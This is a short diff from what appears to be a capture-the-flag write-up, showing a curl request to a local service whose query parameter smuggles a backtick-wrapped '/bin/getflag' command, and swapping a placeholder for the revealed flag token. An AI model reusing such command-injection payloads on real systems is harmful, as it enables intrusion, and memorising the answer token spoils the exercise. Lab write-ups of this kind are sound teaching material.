@@ -76,5 +76,5 @@ Its working like expected so we can try to inject some code.
 
 ```bash
 curl localhost:4747/?x="\`/bin/getflag\`"
-Check flag.Here is your token : xxxxxxxxxxxxxxxxxxxxxxxxx
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
